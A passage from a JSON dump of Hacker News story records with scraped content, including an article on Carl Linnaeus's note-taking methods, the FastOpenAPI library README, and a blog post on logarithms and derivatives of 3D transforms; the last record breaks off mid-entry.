    "id": "c3f6830e93b247e4",
    "title": {
      "en": "Carl Linnaeus's note-taking innovations",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://jillianhess.substack.com/p/carl-linnaeuss-note-taking-innovations",
    "score": 7,
    "by": "sandebert",
    "time": 1742710016,
    "content": "Share this postNotedCarl Linnaeus's Note-Taking InnovationsCopy linkFacebookEmailNotesMoreDiscover more from NotedTips from the world's best note takersOver 29,000 subscribersSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.Already have an account? Sign inCarl Linnaeus's Note-Taking Innovations\"I do not recommend drawings . . . in fact, I absolutely reject them\"Jillian HessMar 10, 2025199Share this postNotedCarl Linnaeus's Note-Taking InnovationsCopy linkFacebookEmailNotesMore6615ShareEven if you know nothing about the Swedish doctor, professor, and naturalist Carl Linnaeus (1707-1778), you probably know about his greatest innovation: binomial nomenclature. Prior to Linnaeus, naturalists had no systematic way to name a plant or animal. Linnaeus came up with the idea of naming according to genus and species; hence, humans are known as homo sapiens. Genus is the larger umbrella term of related groups (wolves and dogs are part of the same genus, Canis). Linnaeus’s system allowed naturalists to easily group and categorize the natural world, making it more legible for scientific inquiry. Linnaeus was also the first to grow a banana in Europe. He was able to do this because he was obsessed with collecting as many samples of the natural world as possible.1 He was also one of the first people to use what we think of as note cards.Linnaeus’s life’s work was one of organization and categorization. So, it makes sense that he was also fascinated by note-taking. In fact, he innovated quite a few systems, which we’ll cover in this post.Linnaeus’s HerbariumAs a student at the University of Lund, Linnaeus began collecting dried plant and lichen specimens. By the time of his death, he amassed over 13,000 specimens. This collection made it possible for him to set out to give species binomial names in Species Plantarum (1753). LINN 694.7 Delphinium : (Herb Linn)Linnaeus’s major innovation here was to release his specimens from the tyranny of a bound book—as most herbariums were kept (see, for example, Emily Dickinson’s herbarium). Instead, he pasted specimens on loose paper that he organized in a custom made filing cabinet. The point was to group similar specimens together (plants with two stamens vs. plants with three stamens). This made his collection flexible and infinitely expandable. As he discovered new examples of specific genuses, he could group them together without disassembling the entire collection.2The Linnaean Society put together this wonderful video to demonstrate how Linnaeus used his herbarium cabinet:Originally, Linnaeus collected specimens himself, but as his fame grew, acquaintances would send him specimens. He also sent his students off on expeditions to collect samples.Linnaeus’s SketchesFrom 1732-1735, Linnaeus traveled through the northern parts of Sweden. He aimed to collect information on his country’s natural resources. He had long conversations with the native people of Lapland, the Sámi. He copied the information he learned in his “Lapland Journals” along with intricate drawings.3‘Oeconomia Lapponica,’ Linnean Society of London, Library and Archives, Linnaean manuscript collection, Call no. GB-110/LM/LP/TRV/1/4/1. You can see more of Linnaeus’s Lapland illustrations in the 'Iter Lapponicum' (1732)For Linnaeus, the actual specimen would always trump a drawing of it. So he also carried back many samples of the natural vegetation he encountered in Lapland. In Genera Plantarum, he went so far as to exclaim,I do not recommend drawings . . . for determining genera – in fact, I absolutely reject them…4Even so, drawing was often necessary to document his findings. In his “Botanical Notebook” he illustrates different types of leaves and flower that would help him identify plants.The Botanical Notebook of Linnaeus, Slovak National Library, c.1750-1751Soon Linnaeus was publishing his findings and updating them every year with new editions of his books. To prepare for new editions, he usually wrote in copies of the books themselves.Linnaeus’s Interleaved BooksIn the seventeenth-century, writing in books was a common practice. So common, in fact, that books were sold “interleaved,” meaning that they had blank pages inserted. This is how Linnaeus continued to build on his botanical research. As he learned more about the flora he documented, he added notations that he could use in subsequent editions of this work.Linnaeus’s  interleaved copy of his Genera plantarum (1737), Library of the Linnean Society (London), Linnaean Collections, Call no. BL 49A, p. 268This practice was so common that readers of Linnaeus’s work bought interleaved copies of their own so they could record their personal observations of the natural world alongside the great naturalist’s. This, for example, is how the 18th-century poet Thomas Gray read Linnaeus’s work; Gray recorded his own observations in the blank pages next to Linnaeus’s writing.5Linnaeus’s Note CardsMuch like his herbarium, Linnaeus required a flexible, expandable way to collect information on the different genera  he catalogued. Thus, he began using small slips of paper (7.5 x 13.0 cm)—much like our modern index cards. In fact, Linnaeus was one of the first to use them.  Whenever he learned of a new genus, he could easily add a notecard. Paper Slips used in the mid 1760s, The Linnean Society of London.Linnaeus filled these paper slips with a fairly standard set of information about each species. He began with the genus name and then progressed to describe defining characteristics including descriptions of the stamen (STA), the piston (PIS) as well as observations (OBS).The western honey-bee, or apis melliferaWe still categorize the natural world according to Linnaeus’s hierarchy (Domain, Kingdom, Phylum, Class, Order, Family, Genus, Species). And we still name species according to Linnaeus’s binomial nomenclature. But none of his innovations in the realm of natural history would have come to pass without the enormous effort he put into his note-taking practices. Notes on Linnaeus’s NotesThink outside the bound book: I love a notebook as much as anyone, but they don’t work particularly well for accumulating information within discrete categories. If you want to keep similar information together (examples of plants with similar structures) then an infinitely-expandable system works best. And this system has generally been deployed with note-cards. Drawings can only do so much: Many of Linnaeus’s biographers point out that he wasn’t the best illustrator. They claim this is one of the reasons why he did not recommend illustration as a way to capture information. Whether or not this is true, the fact remains that every drawing is only an interpretation—a two-dimensional representation of something that exists in the real world. I often think of notes in this way: Our notes are not the thing we are trying to capture, but our interpretation of that thing. Even a quotation represents our particular selection taken from a larger body of work.Add blank pages to your books: We usually don’t purchase custom-made printed books today, so we can’t ask a publisher to interleave a book for us. However, we can add blank pages to books with sticky notes or even loose-leaf. How, I wonder, would we approach books if we were expected to write in them?Noted is fueled by you. Your ❤️’s and comments inspire me. As always, I would love to know your thoughts.Leave a commentYours in note-taking,1Beil, Karen Magnuson. What Linnaeus Saw: A Scientist’s Quest to Name Every Living Thing. Norton, 2019, especially Ch. 5.2For more on the cabinet, see Müller-Wille, Staffan. “Linnaeus’ Herbarium Cabinet: A Piece of Furniture and Its Function.” Endeavour, vol. 30, no. 2, June 2006, pp. 60–64. ScienceDirect.3For a wonderful exploration of Linnaeus’s Lapland illustrations see Charmantier, Isabelle. “Carl Linnaeus and the Visual Representation of Nature.” Historical Studies in the Natural Sciences, vol. 41, no. 4, 2011, pp. 365–404. 4Müller-Wille, Staffan, and Karen Reeds. “A Translation of Carl Linnaeus’s Introduction to Genera Plantarum (1737).” Studies in History and Philosophy of Science Part C: Studies in History and Philosophy of Biological and Biomedical Sciences, vol. 38, no. 3, Sept. 2007, pp. 563–72. 5Norton, Charles Eliot, et al. The Poet Gray as a Naturalist : With Selections from His Notes on the Systema Naturae of Linnaeus, and Facsimiles of Some of His Drawings. Boston : Charles E. Goodspeed, 1903. Internet Archive. Here is an example of Gray’s notes in his interleaved copy of Systema Naturae:Subscribe to NotedBy Jillian Hess · Thousands of paid subscribersTips from the world's best note takersSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.199 Likes∙15 Restacks199Share this postNotedCarl Linnaeus's Note-Taking InnovationsCopy linkFacebookEmailNotesMore6615SharePreviousNext",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "11859a6c056f214a",
    "title": {
      "en": "The Vectrex Computer",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.amigalove.com/viewtopic.php?t=2887",
    "score": 64,
    "by": "erickhill",
    "time": 1742683941,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c3b6789ceb3c102a",
    "title": {
      "en": "Show HN: FastOpenAPI – automated docs for many Python frameworks",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/mr-fatalyst/fastopenapi",
    "score": 124,
    "by": "mr_Fatalyst",
    "time": 1742652630,
    "content": "FastOpenAPI is a library for generating and integrating OpenAPI schemas using Pydantic and various frameworks.\n\n  This project was inspired by FastAPI and aims to provide a similar developer-friendly experience.\n\n📦 Installation\nInstall only FastOpenAPI:\npip install fastopenapi\n\nInstall FastOpenAPI with a specific framework:\npip install fastopenapi[falcon]\n\npip install fastopenapi[flask]\n\npip install fastopenapi[sanic]\n\npip install fastopenapi[starlette]\n\npip install fastopenapi[tornado]\n\n🛠️ Quick Start\nStep 1. Create an application\n\nCreate the main.py file\nCopy the code from an example\nFor some examples uvicorn is required (pip install uvicorn)\n\nExamples:\n\n  Click to expand the Falcon Example\nimport falcon.asgi\nimport uvicorn\nfrom pydantic import BaseModel\n\nfrom fastopenapi.routers import FalconRouter\n\napp = falcon.asgi.App()\nrouter = FalconRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\nasync def hello(name: str):\n    \"\"\"Say hello from Falcon\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Falcon!\")\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"127.0.0.1\", port=8000)\n\n  Click to expand the Flask Example\nfrom flask import Flask\nfrom pydantic import BaseModel\n\nfrom fastopenapi.routers import FlaskRouter\n\napp = Flask(__name__)\nrouter = FlaskRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\ndef hello(name: str):\n    \"\"\"Say hello from Flask\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Flask!\")\n\nif __name__ == \"__main__\":\n    app.run(port=8000)\n\n  Click to expand the Quart Example\nfrom pydantic import BaseModel\nfrom quart import Quart\n\nfrom fastopenapi.routers import QuartRouter\n\napp = Quart(__name__)\nrouter = QuartRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\nasync def hello(name: str):\n    \"\"\"Say hello from Quart\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Quart!\")\n\nif __name__ == \"__main__\":\n    app.run(port=8000)\n\n  Click to expand the Sanic Example\nfrom pydantic import BaseModel\nfrom sanic import Sanic\n\nfrom fastopenapi.routers import SanicRouter\n\napp = Sanic(\"MySanicApp\")\nrouter = SanicRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\nasync def hello(name: str):\n    \"\"\"Say hello from Sanic\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Sanic!\")\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=8000)\n\n  Click to expand the Starlette Example\nimport uvicorn\nfrom pydantic import BaseModel\nfrom starlette.applications import Starlette\n\nfrom fastopenapi.routers import StarletteRouter\n\napp = Starlette()\nrouter = StarletteRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\nasync def hello(name: str):\n    \"\"\"Say hello from Starlette\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Starlette!\")\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"127.0.0.1\", port=8000)\n\n  Click to expand the Tornado Example\nimport asyncio\n\nfrom pydantic import BaseModel\nfrom tornado.web import Application\n\nfrom fastopenapi.routers.tornado import TornadoRouter\n\napp = Application()\n\nrouter = TornadoRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\ndef hello(name: str):\n    \"\"\"Say hello from Tornado\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Tornado!\")\n\nasync def main():\n    app.listen(8000)\n    await asyncio.Event().wait()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n\nStep 2. Run the server\nLaunch the application:\npython main.py\n\nOnce launched, the documentation will be available at:\nSwagger UI:\nhttp://127.0.0.1:8000/docs\n\nReDoc UI:\nhttp://127.0.0.1:8000/redoc\n\n⚙️ Features\n\nGenerate OpenAPI schemas with Pydantic v2.\nData validation using Pydantic models.\nSupports multiple frameworks: Falcon, Flask, Quart, Sanic, Starlette, Tornado.\nProxy routing provides FastAPI-style routing\n\n📖 Documentation\nExplore the Docs for an overview of FastOpenAPI, its core components, and usage guidelines. The documentation is continuously updated and improved.\n\n📂 Advanced Examples\nExamples of integration and detailed usage for each framework are available in the examples directory.\n\n📊 Quick & Dirty Benchmarks\nFast but not perfect benchmarks. Check the benchmarks directory for details.\n\n✅ Development Recommendations\n\nUse Pydantic models for strict typing and data validation.\nFollow the project structure similar to provided examples for easy scalability.\nRegularly update dependencies and monitor library updates for new features.\n\n🛠️ Contributing\nIf you have suggestions or find a bug, please open an issue or create a pull request on GitHub.\n\n📄 License\nThis project is licensed under the terms of the MIT license.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "7ebe6c4ba0f90ac6",
    "title": {
      "en": "Derivatives and Logarithms of 3D Transforms",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://nosferalatu.com/./DerivativesLogarithmsTransforms.html",
    "score": 55,
    "by": "nosferalatu123",
    "time": 1742515596,
    "content": "Derivatives, Logarithms, andTransforms\n\n    Date\n\n         Tue 07 February 2023\n\nTags\n\tProgramming\n\n                Given a transform TTT and a point x, we can find the transformed point with T∗xT∗xT * x. But what if we want to smoothly interpolate TTT so it moves xxx along the path from its initial position to its position transformed by TTT?\nWhat we want to find is the point xxx at time ttt:\nx(t)=T(t)∗x(0)x(t)=T(t)∗x(0)x(t) = T(t) *x(0)\nwhere x(0)x(0)x(0) is the point’s initial position, and T(t)T(t)T(t) is the transform at time ttt. Since we have only a single transform TTT, we need to find a way to interpolate it overtime.\nOne way to accomplish this is to raise TTT to the power of ttt, which can be done using the exponential and logarithm of the transform. Interestingly, the logarithm of a transform can also be used to easily find the velocity of a point xxx in space: the velocity vector (also called the tangent vector) is just log(T)∗xlog(T)∗xlog(T) * x. This blog post shows the relationship between the logarithm andvelocity.\nExample\nCheck out this interactive example to see how the vector field changes as you manipulate the gizmo to translate and rotate the transform. The vector field represents the velocity vector at each point in space during thetransformation.\nAs you move the gizmo, you’ll notice a white curve that traces the path from the origin to the gizmo’s transform. Along this curve, you’ll see the interpolated transform as it travels from the origin to the gizmo. As you can see, the interpolation follows the flow of the velocity vector field. The applet’s code is using the exponential and logarithm of the transform to compute the curve, interpolated transform, and vectorfield.\n\n   ControlsGizmoModeRotateTranslateRotateShowVectorFieldShowOriginAxesShowGizmoShowInterpolatedTransform\n\nThe source code for the applet can be found here, which includes an implementation of closed-form log() and exp() for rigid bodytransforms.\nNext, I’ll describe how to compute the interpolated transform and the velocity vector field you see in thisexample.\nWhat’s T(t)T(t)T(t)?\nWe have TTT, but not T(t)T(t)T(t), which changes with time. Assuming that multiplying two transforms represents the composition of those transforms, we can find T(t)T(t)T(t) bysaying\nT(0)=IT(0)=IT(0) = I (the identitytransform)\nT(1)=TT(1)=TT(1) =T\nT(2)=T∗TT(2)=T∗TT(2) = T *T\nT(3)=T∗T∗TT(3)=T∗T∗TT(3) = T * T *T\nMore generally, we can find TTT at any time bysaying\nT(t)=TtT(t)=TtT(t) = T^t.\nThe above trick is from a blog post by Fabian Giesen here but works for any transform that uses multiplication forcomposition.\nNow that we know T(t)=TtT(t)=TtT(t) = T^t, the original equation can be rearrangedto\nx(t)=Tt∗x(0)x(t)=Tt∗x(0)x(t) = T^t * x(0).\nWhat’s TtTtT^t?\nTo compute TtTtT^t, we need to use the matrix exponential and matrixlogarithm.\nLet’s start with two facts about a matrixX:\nelog(X)=Xelog(X)=Xe^{log(X)} = Xand\nlog(Xy)=log(X)∗ylog(Xy)=log(X)∗ylog(X^y) = log(X) * y.\nPut together, we can saythat\nTt=elog(Tt)=elog(T)∗tTt=elog(Tt)=elog(T)∗tT^t = e^{log(T^t)} =e^{log(T)*t}\nwhich we can plug into the earlier equation, givingus\nx(t)=elog(T)∗t∗x(0)x(t)=elog(T)∗t∗x(0)x(t) = e^{log(T) * t} * x(0).\nThis says that to find the point x at time t, find the transform at time t using elog(T)∗telog(T)∗te^{log(T) * t}, and use that to transform the point at its initial position (at time0).\nWhat’s thederivative?\nIn calculus, we learnedthat\nddteat=aeatddteat=aeat\\dfrac{d}{dt}e^{a t} = a e^{at}\nwhich holds true for matrices aswell:\nddteAt=AeAtddteAt=AeAt\\dfrac{d}{dt}e^{A t} = A e^{At}\nThis relationship is explained in more detail in the section the derivative of the matrix exponential.\nWe can use this property to find the derivative of our earlier equation x(t)=elog(T)tx(0)x(t)=elog(T)tx(0)x(t) = e^{log(T)t} x(0) with respect tot:\nddtx(t)=log(T)elog(T)tx(0)ddtx(t)=log(T)elog(T)tx(0)\\dfrac{d}{dt}x(t) = log(T) e^{log(T) t} x(0).\nThis equation states that to find the first derivative (the velocity vector, also called the tangent vector) of the point at time t, you first transform the point’s initial position x(0)x(0)x(0) with the interpolated transform elog(T)telog(T)te^{log(T)t} and then multiply it by the logarithm of the transform log(T)log(T)log(T). This expression follows the right-to-left convention of column vectors, so you would start with the initial position x(0)x(0)x(0), then apply the interpolated transform elog(T)telog(T)te^{log(T)t}, and finally multiply by the logarithm log(T)log(T)log(T).\nelog(T)telog(T)te^{log(T) t} acts as an operator that maps points from their initial position to their new position at time t. The matrix exponential can be thought of as like integration. At time 0, elog(T)telog(T)te^{log(T) t} is the identity matrix (e0=Ie0=Ie^0=I for matrix exponentials), and at time 1.0, elog(T)telog(T)te^{log(T) t} is equal to the original transform matrix T (elog(T)=Telog(T)=Te^{log(T)}=T).\nWhat’s this allmean?\nIf we take the equation at the end of “What’s TtTtT^t?”\nx(t)=elog(T)tx(0)x(t)=elog(T)tx(0)x(t) = e^{log(T) t}x(0)\nand substitute that into the equation at the end of “What’s thederivative?”\nddtx(t)=log(T)elog(T)tx(0)ddtx(t)=log(T)elog(T)tx(0)\\dfrac{d}{dt}x(t) = log(T) e^{log(T) t} x(0),\nthen wehave:\nddtx(t)=log(T)x(t)ddtx(t)=log(T)x(t)\\dfrac{d}{dt}x(t) = log(T) x(t).\nThis relates the derivative of a moving point to the logarithm of the transformation moving thatpoint.\nOne way to think of log(T)log(T)log(T) is as a vector field of tangent vectors for the transformation. In other words, it’s the field of first derivatives. This vector field is independent of time and shows the velocity for every point inspace.\nThat equation is saying that if you transform any point in space by the logarithm of the transform, you will get the first derivative at that point. The first derivative is the velocity, so log(T)log(T)log(T) defines the velocity field (the field of tangent vectors at every point inspace).\nAs a point moves through space by the transform, it forms a curve. The tangent vector at time t is tangent to the point’s position on the curve at timet.\nYou can think of the logarithm of a matrix as the velocity field of the action performed by that matrix. The velocity field visualized in the interactive example above is thisfield.\nA more informal way of looking at this is tosay\nvelocity=log(transform)∗positionvelocity=log(transform)∗positionvelocity = log(transform) *position\nmeaning, to understand how a point will move in time, look at the vector field of the log of the transform as a velocity field. As the point flows along that velocity field, it moves intime.\nWhat’s the differentialequation?\nWe can also reformulate all of this as a differential equation. Earlier, wehad\nddtx(t)=log(T)x(t)ddtx(t)=log(T)x(t)\\dfrac{d}{dt} x(t) = log(T)x(t)\nwhich is a differential equation. Because log(T)log(T)log(T) is a matrix, it is more specifically a matrix differentialequation.\nScalar ordinary differential equations of theform\ny′(t)=ay(t)y′(t)=ay(t)y'(t)=ay(t)\nhave the generalsolution\ny(t)=eaty(0)y(t)=eaty(0)y(t)=e^{at}y(0).\nSimilarly, matrix differential equations of theform\nx′(t)=Ax(t)x′(t)=Ax(t)x'(t)=Ax(t)\nhave the generalsolution\nx(t)=eAtx(0)x(t)=eAtx(0)x(t)=e^{At}x(0).\nTherefore, given our equation fromearlier\nddtx(t)=log(T)x(t)ddtx(t)=log(T)x(t)\\dfrac{d}{dt} x(t) = log(T)x(t)\nwe have thesolution\nx(t)=elog(T)tx(0)x(t)=elog(T)tx(0)x(t) = e^{log(T) t} x(0).\nThis is the same as our original equation, but we started with a differential equation and found a solution. To prove this solution is correct, just take the derivative of it, which is what we did earlier in the What’s the derivative?section.\nThe exponential map and logarithmmap\nThe exponential map is defined as the infiniteseries\neAt=I+At+12(At)2+13!(At)3+...=∑i=0∞(At)ii!eAt=I+At+12(At)2+13!(At)3+...=∑i=0∞(At)ii!e^{A t} = I + A t + \\frac{1}{2}(A t)^2 + \\frac{1}{3!}(A t)^3 + ... = \\sum_{i=0}^{\\infty} \\frac{(At)^i}{i!}\nand can be used to find the exponential of real numbers, complex numbers, quaternions, matrices, and more. For example, when square matrices are plugged in to the series, the result is called the matrix exponential.\nSimilarly, the logarithm is defined as the infiniteseries\nlog(A)=∑i=1∞(−1)i+1(A−I)iilog(A)=∑i=1∞(−1)i+1(A−I)iilog(A) = \\sum_{i=1}^{\\infty} (-1)^{i+1} \\frac{(A - I)^i}{i}\nIf you want to know more, search for the exponential map and logarithm map. You’ll find that these are important concepts in Lie group theory. The exponential map and logarithm map are inverses of each other. In Lie theory, the exponential map maps a tangent vector at a point p to a point on the manifold. The logarithm map does the opposite, mapping a point on the manifold back to the tangent vector atp.\nWhen reading about Lie groups, you’ll come across many different kinds of groups. There are only a few groups that are related to transforms, though. SO(3) is a 3D rotation matrix, SU(2) is a quaternion, SE(3) is a 3D rigid body transform (rotation and translation), SIM(3) is rotation, translation, and (positive) uniform scale, and GL(n) is an nxnmatrix.\nThere are several options for how to practically compute the exponential and logarithm map for a matrix or otherobject:\n1) Use a math library like Eigen or Armadillo. These have functions to compute the matrix exponential and matrixlogarithm.\n2) The library Sophus has code for a closed form exp/log for the groups SO(3), SE(3), and SIM(3). Beware that it clamps its quaternions to a 3D rotation angle in -ππ\\pi … +ππ\\pithough.\n3) There is an excellent PDF at the web site of Ethan Eade here which contains the closed form equations for the groups SO(3), SE(3), and SIM(3).\n4) Compute the matrix exponential and logarithm by using the infinite series definitions above, and truncating after some number of terms. In my experience, this is not robust when working with floating point numbers, as you quickly start to deal with very small and very large numbers, depending on your inputmatrix.\n5) Compute the exponential with numerical integration. Given a starting point xxx, integrating it for time t is the same thing as the exponential. There are many ways to compute numerical integration, from Euler to Runge-Kutta to adaptivemethods.\nPitfalls\nThere are a few issues that you should be awareof.\nPitfall#1\nThe logarithm of a rotation matrix will return a 3D rotation angle in -ππ\\pi … +ππ\\pi. More technically, there are an infinite number of logarithms for a matrix, each corresponding to a rotation angle that is  2ππ\\pi greater than the previous one. Generally matrix logarithm code will return the principal logarithm, which is the logarithm in -ππ\\pi … +ππ\\pi. This can lead to discontinuities when interpolating transforms with rotations in them, such rotations from human joints (you can move your head from looking over your left shoulder to over your right shoulder and rotate a little more than 180degrees).\nOn the other hand, the logarithm of a quaternion returns a 3D rotation angle in the larger range of -2ππ\\pi … +2ππ\\pi, which makes quaternions nicer to workwith.\nPitfall#2\nWhen working with logarithms, be aware that that theproperty\nlog(AB)=log(A)+log(B)log(AB)=log(A)+log(B)log(AB) = log(A) +log(B)\nis only true when A and B commute, which is not the case for most transforms. Real numbers always commute, though, so the property does apply to them. It’s tempting to apply the property to transforms, but it’s important to remember it only applies when A and Bcommute.\nPitfall#3\nRelated to pitfall #2, you might want to interpolate two transforms A and Bwith\ninterpolate(A,B,t)=e(1−t)∗log(A)+t∗log(B)interpolate(A,B,t)=e(1−t)∗log(A)+t∗log(B)interpolate(A, B, t) = e^{(1-t)*log(A) +t*log(B)}\nBut be careful: this only works if A and B commute, which is not usually the case for transforms. Otherwise, this interpolation is neither shortest path nor constantspeed.\nInstead, interpolate the relative (also called delta) transform from A to B, likethis:\ninterpolate(A,B,t)=elog(BA−1)tAinterpolate(A,B,t)=elog(BA−1)tAinterpolate(A, B, t) = e^{log(B A^{-1}) t}A\nHowever, this method only works for interpolating between two transforms and not for blending more than twotransforms.\nVisualizing a matrix as a vectorfield\nIf you are wondering how you can visualize a matrix as a vector field, an eloquent explanation is in 3Blue1Brown’s video about matrix exponentiation. This part about matrices as vector fields explains that verywell:\n\nThe derivative of the matrixexponential\nEarlier we used the property ddteAt=AeAtddteAt=AeAt\\dfrac{d}{dt}e^{A t} = A e^{A t}. It’s not obvious why this property is true, but it’s an important part of unlocking all ofthis.\nA good reference for this derivation is in the textbook Modern Robotics. A free copy of that book can be found here. See equation (3.43) in thatbook.\nThe matrix exponential is definedas\neAt=I+At+12(At)2+13!(At)3+...eAt=I+At+12(At)2+13!(At)3+...e^{A t} = I + A t + \\frac{1}{2}(A t)^2 + \\frac{1}{3!}(A t)^3 +...\nWhat then is ddteAtddteAt\\dfrac{d}{dt}e^{A t}? If we take the derivative of each term of the matrix exponential’s expanded definition, wehave\nddteAt=0+A+A2t+12A3t2+...ddteAt=0+A+A2t+12A3t2+...\\dfrac{d}{dt}e^{A t} = 0 + A + A^2 t + \\frac{1}{2} A^3 t^2 +...\nPull out A, and then wehave\nddteAt=A∗(I+At+12(At)2+...)=AeAtddteAt=A∗(I+At+12(At)2+...)=AeAt\\dfrac{d}{dt}e^{A t} = A*(I + A t + \\frac{1}{2} (A t)^2 + ...) = A e^{A t}.\nIt’s worth noting that the matrix AAA can go on the left or right, and it always holds truethat\nAeAt=eAtAAeAt=eAtAAe^{A t} = e^{At}A\nfor any square matrix, as stated in equation (3.44) in ModernRobotics.\nComments\nLeave comments on this post with Github Issues here.\nif (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {\n    var align = \"center\",\n        indent = \"0em\",\n        linebreak = \"false\";\n\n    if (false) {\n        align = (screen.width < 768) ? \"left\" : align;\n        indent = (screen.width < 768) ? \"0em\" : indent;\n        linebreak = (screen.width < 768) ? 'true' : linebreak;\n    }\n\n    var mathjaxscript = document.createElement('script');\n    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';\n    mathjaxscript.type = 'text/javascript';\n    mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML';\n\n    var configscript = document.createElement('script');\n    configscript.type = 'text/x-mathjax-config';\n    configscript[(window.opera ? \"innerHTML\" : \"text\")] =\n        \"MathJax.Hub.Config({\" +\n        \"    config: ['MMLorHTML.js'],\" +\n        \"    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" +\n        \"    jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" +\n        \"    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" +\n        \"    displayAlign: '\"+ align +\"',\" +\n        \"    displayIndent: '\"+ indent +\"',\" +\n        \"    showMathMenu: true,\" +\n        \"    messageStyle: 'normal',\" +\n        \"    tex2jax: { \" +\n        \"        inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" +\n        \"        displayMath: [ ['$$','$$'] ],\" +\n        \"        processEscapes: true,\" +\n        \"        preview: 'TeX',\" +\n        \"    }, \" +\n        \"    'HTML-CSS': { \" +\n        \"        availableFonts: ['STIX', 'TeX'],\" +\n        \"        preferredFont: 'STIX',\" +\n        \"        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" +\n        \"        linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" +\n        \"    }, \" +\n        \"}); \" +\n        \"if ('default' !== 'default') {\" +\n            \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" +\n                \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" +\n                \"VARIANT['normal'].fonts.unshift('MathJax_default');\" +\n                \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" +\n                \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" +\n                \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" +\n            \"});\" +\n            \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" +\n                \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" +\n                \"VARIANT['normal'].fonts.unshift('MathJax_default');\" +\n                \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" +\n                \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" +\n                \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" +\n            \"});\" +\n        \"}\";\n\n    (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript);\n    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);\n}",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "869d40a09904001e",
    "title": {
      "en": "Crabtime: Zig’s Comptime in Rust",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://crates.io/crates/crabtime",
    "score": 420,
    "by": "klaussilveira",
    "time": 1742409851,
    "content": "Click here to read the docs!",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "bb7728a51670dda3",
    "title": {
      "en": "Show HN: We made an MCP server so Cursor can debug Node.js on its own",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.npmjs.com/package/@hyperdrive-eng/mcp-nodejs-debugger",
    "score": 96,
    "by": "arthurgousset",
    "time": 1742659046,
